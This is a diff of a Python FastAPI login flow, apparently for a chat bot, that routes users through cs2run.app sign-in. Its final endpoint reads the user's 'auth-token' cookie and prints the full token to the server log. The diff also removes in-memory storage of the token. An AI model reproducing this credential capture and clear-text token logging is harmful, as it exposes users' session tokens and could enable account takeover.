@@ -10,15 +10,16 @@ RAM_DATA = {}
 
 # 1️⃣ Точка входа: даём пользователю ссылку
 @router.get("/auth/login")
-async def auth_login(chat_id: int = Query(...)):
+async def auth_login(chat_id: int):
     import aiohttp
 
-    return_url = f"{SELF_URL}/auth/steam?chat_id={chat_id}"
+    # ЭТО — финальная точка, куда cs2run вернёт пользователя
+    final_return = f"{SELF_URL}/auth/final?chat_id={chat_id}"
 
     async with aiohttp.ClientSession() as session:
         async with session.get(
             "https://cs2run.app/auth/1/get-url/",
-            params={"return_url": return_url}
+            params={"return_url": final_return}
         ) as r:
             data = await r.json()
 
@@ -51,10 +52,8 @@ async def auth_final(request: Request, chat_id: int):
     auth_token = request.cookies.get("auth-token")
 
     if not auth_token:
-        return HTMLResponse("<h2>❌ Ошибка: auth-token не получен</h2>")
+        return HTMLResponse("❌ auth-token не получен")
 
-    print(f"\n🔥 [SUCCESS] Chat {chat_id} auth-token:\n{auth_token}\n")
+    print(f"\n🔥 AUTH TOKEN FOR {chat_id}:\n{auth_token}\n")
 
-    RAM_DATA[chat_id] = {"auth_token": auth_token}
-
-    return HTMLResponse("<h2>✅ Авторизация завершена. Можно закрыть страницу.</h2>")
+    return HTMLResponse("✅ Авторизация завершена, можно закрыть страницу.")
